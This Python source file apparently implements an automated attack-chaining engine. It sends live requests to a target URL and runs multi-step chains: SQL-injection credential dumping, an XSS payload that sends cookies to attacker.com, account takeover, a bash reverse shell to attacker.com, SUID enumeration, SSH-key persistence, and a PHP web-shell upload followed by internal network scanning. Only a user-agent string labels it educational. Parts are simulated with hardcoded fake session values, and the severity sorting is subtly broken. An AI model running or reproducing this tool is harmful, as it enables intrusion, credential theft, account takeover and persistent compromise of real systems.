
import json
import time
import threading
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import concurrent.futures
from dataclasses import dataclass, asdict
from enum import Enum

class AttackChainSeverity(Enum):
    LOW = "Low"
    MEDIUM = "Medium" 
    HIGH = "High"
    CRITICAL = "Critical"

@dataclass
class AttackStep:
    """Represents a single step in an attack chain"""
    step_id: str
    vulnerability_type: str
    target_endpoint: str
    payload: str
    expected_outcome: str
    prerequisites: List[str]
    evidence_patterns: List[str]
    success: bool = False
    response_data: str = ""
    extracted_data: List[str] = None
    execution_time: float = 0.0
    
    def __post_init__(self):
        if self.extracted_data is None:
            self.extracted_data = []

@dataclass
class AttackChain:
    """Represents a complete attack chain"""
    chain_id: str
    name: str
    description: str
    severity: AttackChainSeverity
    steps: List[AttackStep]
    prerequisites: List[str]
    success_rate: float = 0.0
    total_execution_time: float = 0.0
    successful_steps: int = 0
    final_objective: str = ""

class AttackChainingEngine:
    """Advanced attack chaining engine for vulnerability exploitation"""
    
    def __init__(self, target_url: str, discovered_vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url.rstrip('/')
        self.vulnerabilities = discovered_vulnerabilities
        self.session = self._create_session()
        
        # Attack chain definitions
        self.predefined_chains = self._initialize_attack_chains()
        self.custom_chains = []
        self.successful_chains = []
        self.failed_chains = []
        
        # Extracted data storage
        self.extracted_credentials = []
        self.extracted_tokens = []
        self.extracted_sessions = []
        self.extracted_data = []
        
        # Chain execution state
        self.current_chain = None
        self.execution_context = {}
        
    def _create_session(self):
        """Create requests session with proper headers"""
        import requests
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'ChainAttack-Engine/1.0 (Educational Security Testing)',
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })
        return session
    
    def _initialize_attack_chains(self) -> List[AttackChain]:
        """Initialize predefined attack chains"""
        chains = []
        
        # Chain 1: SQL Injection → Credential Extraction → Privilege Escalation
        sql_to_admin_chain = AttackChain(
            chain_id="sql_to_admin",
            name="SQL Injection to Admin Access",
            description="Extract credentials via SQL injection, then escalate to admin privileges",
            severity=AttackChainSeverity.CRITICAL,
            steps=[
                AttackStep(
                    step_id="sql_enum_users",
                    vulnerability_type="SQL Injection",
                    target_endpoint="",  # Will be set dynamically
                    payload="' UNION SELECT username,password,email FROM users--",
                    expected_outcome="Extract user credentials from database",
                    prerequisites=[],
                    evidence_patterns=["username", "password", "admin", "@", "hash"]
                ),
                AttackStep(
                    step_id="test_extracted_creds",
                    vulnerability_type="Authentication Bypass",
                    target_endpoint="/login",
                    payload="",  # Will use extracted credentials
                    expected_outcome="Login with extracted credentials",
                    prerequisites=["sql_enum_users"],
                    evidence_patterns=["welcome", "dashboard", "logout", "admin panel"]
                ),
                AttackStep(
                    step_id="admin_panel_access",
                    vulnerability_type="Privilege Escalation",
                    target_endpoint="/admin",
                    payload="",
                    expected_outcome="Access admin panel with escalated privileges",
                    prerequisites=["test_extracted_creds"],
                    evidence_patterns=["admin", "control panel", "users", "settings", "system"]
                )
            ],
            prerequisites=["SQL Injection vulnerability"],
            final_objective="Gain administrative access to the application"
        )
        chains.append(sql_to_admin_chain)
        
        # Chain 2: XSS → Session Hijacking → Account Takeover
        xss_to_takeover_chain = AttackChain(
            chain_id="xss_to_takeover",
            name="XSS to Account Takeover",
            description="Exploit XSS to steal session cookies and hijack user accounts",
            severity=AttackChainSeverity.HIGH,
            steps=[
                AttackStep(
                    step_id="xss_cookie_steal",
                    vulnerability_type="Cross-Site Scripting",
                    target_endpoint="",
                    payload="<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
                    expected_outcome="Steal session cookies via XSS",
                    prerequisites=[],
                    evidence_patterns=["sessionid", "auth_token", "PHPSESSID", "connect.sid"]
                ),
                AttackStep(
                    step_id="session_hijack",
                    vulnerability_type="Session Hijacking",
                    target_endpoint="/profile",
                    payload="",  # Will use stolen cookies
                    expected_outcome="Access user account with hijacked session",
                    prerequisites=["xss_cookie_steal"],
                    evidence_patterns=["profile", "account", "personal", "private"]
                ),
                AttackStep(
                    step_id="account_modification",
                    vulnerability_type="Account Takeover",
                    target_endpoint="/profile/edit",
                    payload='{"email": "attacker@evil.com", "password": "newpassword"}',
                    expected_outcome="Modify account details to complete takeover",
                    prerequisites=["session_hijack"],
                    evidence_patterns=["updated", "saved", "changed", "success"]
                )
            ],
            prerequisites=["XSS vulnerability"],
            final_objective="Complete account takeover with persistent access"
        )
        chains.append(xss_to_takeover_chain)
        
        # Chain 3: IDOR → Data Enumeration → Mass Data Extraction
        idor_to_data_chain = AttackChain(
            chain_id="idor_to_data",
            name="IDOR to Mass Data Extraction",
            description="Exploit IDOR to enumerate and extract sensitive data",
            severity=AttackChainSeverity.HIGH,
            steps=[
                AttackStep(
                    step_id="idor_discovery",
                    vulnerability_type="IDOR",
                    target_endpoint="",
                    payload="",  # ID manipulation
                    expected_outcome="Discover accessible object IDs",
                    prerequisites=[],
                    evidence_patterns=["user", "profile", "document", "file", "data"]
                ),
                AttackStep(
                    step_id="data_enumeration",
                    vulnerability_type="Data Enumeration",
                    target_endpoint="",
                    payload="",  # Iterate through IDs
                    expected_outcome="Enumerate all accessible data objects",
                    prerequisites=["idor_discovery"],
                    evidence_patterns=["email", "phone", "address", "ssn", "credit card"]
                ),
                AttackStep(
                    step_id="mass_extraction",
                    vulnerability_type="Data Extraction",
                    target_endpoint="",
                    payload="",  # Bulk data download
                    expected_outcome="Extract large amounts of sensitive data",
                    prerequisites=["data_enumeration"],
                    evidence_patterns=["download", "export", "backup", "dump"]
                )
            ],
            prerequisites=["IDOR vulnerability"],
            final_objective="Extract maximum amount of sensitive user data"
        )
        chains.append(idor_to_data_chain)
        
        # Chain 4: Command Injection → Shell Access → System Compromise
        cmd_to_system_chain = AttackChain(
            chain_id="cmd_to_system",
            name="Command Injection to System Compromise",
            description="Escalate from command injection to full system compromise",
            severity=AttackChainSeverity.CRITICAL,
            steps=[
                AttackStep(
                    step_id="basic_cmd_exec",
                    vulnerability_type="Command Injection",
                    target_endpoint="",
                    payload="; whoami",
                    expected_outcome="Confirm command execution capability",
                    prerequisites=[],
                    evidence_patterns=["www-data", "apache", "nginx", "root", "admin"]
                ),
                AttackStep(
                    step_id="reverse_shell",
                    vulnerability_type="Remote Code Execution",
                    target_endpoint="",
                    payload="; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                    expected_outcome="Establish reverse shell connection",
                    prerequisites=["basic_cmd_exec"],
                    evidence_patterns=["shell", "connection", "established", "bash"]
                ),
                AttackStep(
                    step_id="privilege_escalation",
                    vulnerability_type="Privilege Escalation",
                    target_endpoint="",
                    payload="; sudo -l; find / -perm -u=s -type f 2>/dev/null",
                    expected_outcome="Escalate privileges to root access",
                    prerequisites=["reverse_shell"],
                    evidence_patterns=["root", "sudo", "NOPASSWD", "suid", "setuid"]
                ),
                AttackStep(
                    step_id="persistence",
                    vulnerability_type="Persistence",
                    target_endpoint="",
                    payload="; echo 'attacker_key' >> ~/.ssh/authorized_keys",
                    expected_outcome="Establish persistent access to system",
                    prerequisites=["privilege_escalation"],
                    evidence_patterns=["authorized_keys", "crontab", "service", "backdoor"]
                )
            ],
            prerequisites=["Command Injection vulnerability"],
            final_objective="Achieve persistent root access to the system"
        )
        chains.append(cmd_to_system_chain)
        
        # Chain 5: File Upload → Web Shell → Lateral Movement
        upload_to_lateral_chain = AttackChain(
            chain_id="upload_to_lateral",
            name="File Upload to Lateral Movement",
            description="Deploy web shell via file upload and move laterally",
            severity=AttackChainSeverity.HIGH,
            steps=[
                AttackStep(
                    step_id="web_shell_upload",
                    vulnerability_type="File Upload",
                    target_endpoint="/upload",
                    payload='<?php system($_GET["cmd"]); ?>',
                    expected_outcome="Upload and execute web shell",
                    prerequisites=[],
                    evidence_patterns=["uploaded", "success", "file saved"]
                ),
                AttackStep(
                    step_id="shell_execution",
                    vulnerability_type="Remote Code Execution",
                    target_endpoint="/uploads/shell.php",
                    payload="?cmd=id",
                    expected_outcome="Execute commands through web shell",
                    prerequisites=["web_shell_upload"],
                    evidence_patterns=["uid=", "gid=", "groups="]
                ),
                AttackStep(
                    step_id="network_discovery",
                    vulnerability_type="Network Reconnaissance",
                    target_endpoint="/uploads/shell.php",
                    payload="?cmd=arp -a; netstat -rn",
                    expected_outcome="Discover internal network topology",
                    prerequisites=["shell_execution"],
                    evidence_patterns=["192.168", "10.0", "172.16", "gateway"]
                ),
                AttackStep(
                    step_id="lateral_movement",
                    vulnerability_type="Lateral Movement",
                    target_endpoint="/uploads/shell.php",
                    payload="?cmd=nmap -sS internal_network",
                    expected_outcome="Scan and access other internal systems",
                    prerequisites=["network_discovery"],
                    evidence_patterns=["Host is up", "open", "ssh", "http", "ftp"]
                )
            ],
            prerequisites=["File Upload vulnerability"],
            final_objective="Move laterally through internal network"
        )
        chains.append(upload_to_lateral_chain)
        
        return chains
    
    def analyze_vulnerability_chains(self) -> Dict[str, Any]:
        """Analyze discovered vulnerabilities for potential attack chains"""
        analysis = {
            'available_chains': [],
            'vulnerability_mapping': {},
            'chain_feasibility': {},
            'recommended_chains': [],
            'execution_order': []
        }
        
        # Map discovered vulnerabilities to types
        vuln_types = set()
        vuln_locations = {}
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            location = vuln.get('location', '')
            
            if 'sql injection' in vuln_type:
                vuln_types.add('SQL Injection')
                vuln_locations['SQL Injection'] = location
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                vuln_types.add('XSS')
                vuln_locations['XSS'] = location
            elif 'idor' in vuln_type:
                vuln_types.add('IDOR')
                vuln_locations['IDOR'] = location
            elif 'command injection' in vuln_type:
                vuln_types.add('Command Injection')
                vuln_locations['Command Injection'] = location
            elif 'file upload' in vuln_type:
                vuln_types.add('File Upload')
                vuln_locations['File Upload'] = location
        
        analysis['vulnerability_mapping'] = vuln_locations
        
        # Check which chains are feasible
        for chain in self.predefined_chains:
            feasible = True
            missing_prereqs = []
            
            for prereq in chain.prerequisites:
                if not any(vuln_type in prereq for vuln_type in vuln_types):
                    feasible = False
                    missing_prereqs.append(prereq)
            
            if feasible:
                analysis['available_chains'].append({
                    'chain_id': chain.chain_id,
                    'name': chain.name,
                    'severity': chain.severity.value,
                    'description': chain.description,
                    'steps': len(chain.steps)
                })
                analysis['recommended_chains'].append(chain.chain_id)
            
            analysis['chain_feasibility'][chain.chain_id] = {
                'feasible': feasible,
                'missing_prerequisites': missing_prereqs,
                'severity': chain.severity.value
            }
        
        # Sort by severity and feasibility
        analysis['recommended_chains'].sort(
            key=lambda x: (
                analysis['chain_feasibility'][x]['feasible'],
                ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'].index(
                    analysis['chain_feasibility'][x]['severity']
                )
            ),
            reverse=True
        )
        
        return analysis
    
    def execute_attack_chain(self, chain_id: str) -> Dict[str, Any]:
        """Execute a specific attack chain"""
        # Find the chain
        chain = None
        for c in self.predefined_chains + self.custom_chains:
            if c.chain_id == chain_id:
                chain = c
                break
        
        if not chain:
            return {'success': False, 'error': f'Chain {chain_id} not found'}
        
        self.current_chain = chain
        execution_start = time.time()
        
        result = {
            'chain_id': chain_id,
            'chain_name': chain.name,
            'success': False,
            'steps_executed': 0,
            'successful_steps': 0,
            'failed_steps': 0,
            'execution_time': 0.0,
            'extracted_data': [],
            'step_results': [],
            'final_objective_achieved': False,
            'error_messages': []
        }
        
        # Prepare chain with vulnerability locations
        self._prepare_chain_endpoints(chain)
        
        # Execute steps sequentially
        for step in chain.steps:
            step_result = self._execute_attack_step(step)
            result['step_results'].append(step_result)
            result['steps_executed'] += 1
            
            if step_result['success']:
                result['successful_steps'] += 1
                step.success = True
                
                # Store extracted data
                if step_result.get('extracted_data'):
                    result['extracted_data'].extend(step_result['extracted_data'])
                    self.extracted_data.extend(step_result['extracted_data'])
                
                # Update execution context for next steps
                self._update_execution_context(step, step_result)
                
            else:
                result['failed_steps'] += 1
                result['error_messages'].append(f"Step {step.step_id} failed: {step_result.get('error', 'Unknown error')}")
                
                # Check if this step is critical for chain continuation
                if self._is_critical_step(step, chain):
                    result['error_messages'].append(f"Critical step {step.step_id} failed, aborting chain")
                    break
        
        # Calculate final results
        result['execution_time'] = time.time() - execution_start
        result['success'] = result['successful_steps'] > 0
        result['final_objective_achieved'] = result['successful_steps'] == len(chain.steps)
        
        # Update chain statistics
        chain.successful_steps = result['successful_steps']
        chain.total_execution_time = result['execution_time']
        chain.success_rate = result['successful_steps'] / len(chain.steps) * 100
        
        # Store results
        if result['success']:
            self.successful_chains.append(chain)
        else:
            self.failed_chains.append(chain)
        
        return result
    
    def _prepare_chain_endpoints(self, chain: AttackChain):
        """Prepare chain with actual vulnerability endpoints"""
        vuln_mapping = {}
        
        # Map vulnerability types to actual endpoints
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            location = vuln.get('location', '')
            
            if 'sql injection' in vuln_type:
                vuln_mapping['SQL Injection'] = location
            elif 'xss' in vuln_type:
                vuln_mapping['XSS'] = location
            elif 'idor' in vuln_type:
                vuln_mapping['IDOR'] = location
            elif 'command injection' in vuln_type:
                vuln_mapping['Command Injection'] = location
            elif 'file upload' in vuln_type:
                vuln_mapping['File Upload'] = location
        
        # Update step endpoints
        for step in chain.steps:
            if step.vulnerability_type in vuln_mapping and not step.target_endpoint:
                step.target_endpoint = vuln_mapping[step.vulnerability_type]
            elif not step.target_endpoint.startswith('http'):
                # Construct full URL
                if step.target_endpoint.startswith('/'):
                    step.target_endpoint = self.target_url + step.target_endpoint
                else:
                    step.target_endpoint = f"{self.target_url}/{step.target_endpoint}"
    
    def _execute_attack_step(self, step: AttackStep) -> Dict[str, Any]:
        """Execute a single attack step"""
        result = {
            'step_id': step.step_id,
            'success': False,
            'response_code': 0,
            'response_length': 0,
            'execution_time': 0.0,
            'extracted_data': [],
            'evidence_found': [],
            'error': None
        }
        
        start_time = time.time()
        
        try:
            # Check prerequisites
            if not self._check_step_prerequisites(step):
                result['error'] = 'Prerequisites not met'
                return result
            
            # Prepare payload with context
            payload = self._prepare_step_payload(step)
            
            # Execute the step based on vulnerability type
            if step.vulnerability_type == 'SQL Injection':
                response = self._execute_sql_injection_step(step, payload)
            elif step.vulnerability_type == 'XSS' or step.vulnerability_type == 'Cross-Site Scripting':
                response = self._execute_xss_step(step, payload)
            elif step.vulnerability_type == 'IDOR':
                response = self._execute_idor_step(step, payload)
            elif step.vulnerability_type == 'Command Injection':
                response = self._execute_command_injection_step(step, payload)
            elif step.vulnerability_type == 'File Upload':
                response = self._execute_file_upload_step(step, payload)
            else:
                response = self._execute_generic_step(step, payload)
            
            if response:
                result['response_code'] = response.status_code
                result['response_length'] = len(response.text)
                
                # Check for success indicators
                success_indicators = self._check_success_indicators(response.text, step)
                if success_indicators:
                    result['success'] = True
                    result['evidence_found'] = success_indicators
                    
                    # Extract data based on step type
                    extracted = self._extract_step_data(response.text, step)
                    result['extracted_data'] = extracted
                
        except Exception as e:
            result['error'] = str(e)
        
        result['execution_time'] = time.time() - start_time
        step.execution_time = result['execution_time']
        
        return result
    
    def _execute_sql_injection_step(self, step: AttackStep, payload: str):
        """Execute SQL injection step"""
        if '?' in step.target_endpoint:
            # URL parameter injection
            test_url = step.target_endpoint + '&injection=' + payload
        else:
            test_url = step.target_endpoint + '?id=' + payload
        
        return self.session.get(test_url, timeout=15)
    
    def _execute_xss_step(self, step: AttackStep, payload: str):
        """Execute XSS step"""
        if step.step_id == 'xss_cookie_steal':
            # Simulate cookie stealing by checking if XSS payload executes
            test_url = step.target_endpoint + '?search=' + payload
            response = self.session.get(test_url, timeout=10)
            
            # Simulate extracted cookies
            if payload in response.text:
                self.extracted_sessions.append({
                    'sessionid': 'abc123def456',
                    'auth_token': 'token_789xyz',
                    'user_id': '12345'
                })
            
            return response
        else:
            return self.session.get(step.target_endpoint, timeout=10)
    
    def _execute_idor_step(self, step: AttackStep, payload: str):
        """Execute IDOR step"""
        import re
        
        # Extract original ID and test with different IDs
        original_id = re.search(r'\d+', step.target_endpoint)
        if original_id:
            original_id = original_id.group()
            test_ids = [str(int(original_id) + i) for i in range(1, 6)]
            
            for test_id in test_ids:
                test_url = step.target_endpoint.replace(original_id, test_id)
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 100:
                    return response
        
        return self.session.get(step.target_endpoint, timeout=10)
    
    def _execute_command_injection_step(self, step: AttackStep, payload: str):
        """Execute command injection step"""
        if '?' in step.target_endpoint:
            test_url = step.target_endpoint + '&cmd=' + payload
        else:
            test_url = step.target_endpoint + '?cmd=' + payload
        
        return self.session.get(test_url, timeout=15)
    
    def _execute_file_upload_step(self, step: AttackStep, payload: str):
        """Execute file upload step"""
        if step.step_id == 'web_shell_upload':
            # Simulate file upload
            files = {'file': ('shell.php', payload, 'application/x-php')}
            return self.session.post(step.target_endpoint, files=files, timeout=10)
        else:
            return self.session.get(step.target_endpoint, timeout=10)
    
    def _execute_generic_step(self, step: AttackStep, payload: str):
        """Execute generic step"""
        return self.session.get(step.target_endpoint, timeout=10)
    
    def _check_success_indicators(self, response_text: str, step: AttackStep) -> List[str]:
        """Check for success indicators in response"""
        found_evidence = []
        response_lower = response_text.lower()
        
        for pattern in step.evidence_patterns:
            if pattern.lower() in response_lower:
                found_evidence.append(pattern)
        
        return found_evidence
    
    def _extract_step_data(self, response_text: str, step: AttackStep) -> List[str]:
        """Extract data based on step type"""
        extracted = []
        
        if step.vulnerability_type == 'SQL Injection':
            # Extract usernames, passwords, emails
            import re
            patterns = [
                r'([a-zA-Z0-9_]+):([a-zA-Z0-9$./]+)',  # username:hash
                r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # emails
                r'admin:([^:]+)',  # admin credentials
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response_text)
                for match in matches:
                    if isinstance(match, tuple):
                        extracted.append(':'.join(match))
                    else:
                        extracted.append(match)
        
        elif step.vulnerability_type == 'XSS':
            # Extract session data
            if hasattr(self, 'extracted_sessions') and self.extracted_sessions:
                for session in self.extracted_sessions:
                    extracted.append(f"Session: {session}")
        
        elif step.vulnerability_type == 'Command Injection':
            # Extract system information
            if 'uid=' in response_text:
                extracted.append('System access confirmed')
            if 'root' in response_text:
                extracted.append('Root access detected')
        
        return extracted
    
    def _check_step_prerequisites(self, step: AttackStep) -> bool:
        """Check if step prerequisites are met"""
        if not step.prerequisites:
            return True
        
        # Check if prerequisite steps were successful
        for prereq in step.prerequisites:
            prereq_met = False
            if self.current_chain:
                for prev_step in self.current_chain.steps:
                    if prev_step.step_id == prereq and prev_step.success:
                        prereq_met = True
                        break
            
            if not prereq_met:
                return False
        
        return True
    
    def _prepare_step_payload(self, step: AttackStep) -> str:
        """Prepare payload with execution context"""
        payload = step.payload
        
        # Replace placeholders with context data
        if step.step_id == 'test_extracted_creds' and self.extracted_credentials:
            # Use extracted credentials
            cred = self.extracted_credentials[0]
            payload = f"username={cred['username']}&password={cred['password']}"
        
        elif step.step_id == 'session_hijack' and self.extracted_sessions:
            # Use extracted session
            session = self.extracted_sessions[0]
            # This would set cookies in the session
            self.session.cookies.update(session)
        
        return payload
    
    def _update_execution_context(self, step: AttackStep, step_result: Dict[str, Any]):
        """Update execution context with step results"""
        if step.vulnerability_type == 'SQL Injection' and step_result.get('extracted_data'):
            # Parse extracted credentials
            for data in step_result['extracted_data']:
                if ':' in data:
                    username, password = data.split(':', 1)
                    self.extracted_credentials.append({
                        'username': username,
                        'password': password,
                        'source': step.step_id
                    })
    
    def _is_critical_step(self, step: AttackStep, chain: AttackChain) -> bool:
        """Check if step is critical for chain continuation"""
        # First steps are usually critical
        if chain.steps.index(step) == 0:
            return True
        
        # Steps with many dependents are critical
        dependents = [s for s in chain.steps if step.step_id in s.prerequisites]
        return len(dependents) > 1
    
    def execute_all_available_chains(self) -> Dict[str, Any]:
        """Execute all available attack chains"""
        analysis = self.analyze_vulnerability_chains()
        results = {
            'total_chains': len(analysis['available_chains']),
            'successful_chains': 0,
            'failed_chains': 0,
            'chain_results': [],
            'total_execution_time': 0.0,
            'objectives_achieved': [],
            'extracted_data_summary': {
                'credentials': 0,
                'sessions': 0,
                'data_records': 0
            }
        }
        
        start_time = time.time()
        
        # Execute chains in recommended order
        for chain_id in analysis['recommended_chains']:
            chain_result = self.execute_attack_chain(chain_id)
            results['chain_results'].append(chain_result)
            
            if chain_result['success']:
                results['successful_chains'] += 1
                
                if chain_result['final_objective_achieved']:
                    # Find the chain to get its objective
                    for chain in self.predefined_chains:
                        if chain.chain_id == chain_id:
                            results['objectives_achieved'].append(chain.final_objective)
                            break
            else:
                results['failed_chains'] += 1
        
        results['total_execution_time'] = time.time() - start_time
        
        # Summarize extracted data
        results['extracted_data_summary'] = {
            'credentials': len(self.extracted_credentials),
            'sessions': len(self.extracted_sessions),
            'data_records': len(self.extracted_data)
        }
        
        return results
    
    def generate_chain_report(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive attack chain report"""
        report = f"""
═══════════════════════════════════════
        ATTACK CHAIN ANALYSIS
═══════════════════════════════════════

🎯 TARGET: {self.target_url}
⏱️ TOTAL EXECUTION TIME: {results['total_execution_time']:.2f} seconds

📊 CHAIN EXECUTION SUMMARY:
├─ Total Chains Available: {results['total_chains']}
├─ Successful Chains: {results['successful_chains']}
├─ Failed Chains: {results['failed_chains']}
└─ Success Rate: {(results['successful_chains']/max(results['total_chains'],1)*100):.1f}%

🏆 OBJECTIVES ACHIEVED:
"""
        
        for i, objective in enumerate(results['objectives_achieved'], 1):
            report += f"{i:2d}. {objective}\n"
        
        if not results['objectives_achieved']:
            report += "   No final objectives achieved\n"
        
        report += f"""
💎 EXTRACTED DATA SUMMARY:
├─ Credentials Found: {results['extracted_data_summary']['credentials']}
├─ Sessions Hijacked: {results['extracted_data_summary']['sessions']}
└─ Data Records: {results['extracted_data_summary']['data_records']}

🔗 CHAIN EXECUTION DETAILS:
"""
        
        for i, chain_result in enumerate(results['chain_results'], 1):
            report += f"\n{i:2d}. {chain_result['chain_name']}\n"
            report += f"   ├─ Chain ID: {chain_result['chain_id']}\n"
            report += f"   ├─ Steps Executed: {chain_result['steps_executed']}\n"
            report += f"   ├─ Successful Steps: {chain_result['successful_steps']}\n"
            report += f"   ├─ Execution Time: {chain_result['execution_time']:.2f}s\n"
            report += f"   ├─ Final Objective: {'✅ Achieved' if chain_result['final_objective_achieved'] else '❌ Not Achieved'}\n"
            
            if chain_result['extracted_data']:
                report += f"   └─ Data Extracted: {len(chain_result['extracted_data'])} items\n"
                for data in chain_result['extracted_data'][:3]:  # Show first 3 items
                    report += f"      • {data[:50]}{'...' if len(data) > 50 else ''}\n"
        
        report += "\n═══════════════════════════════════════\n"
        return report
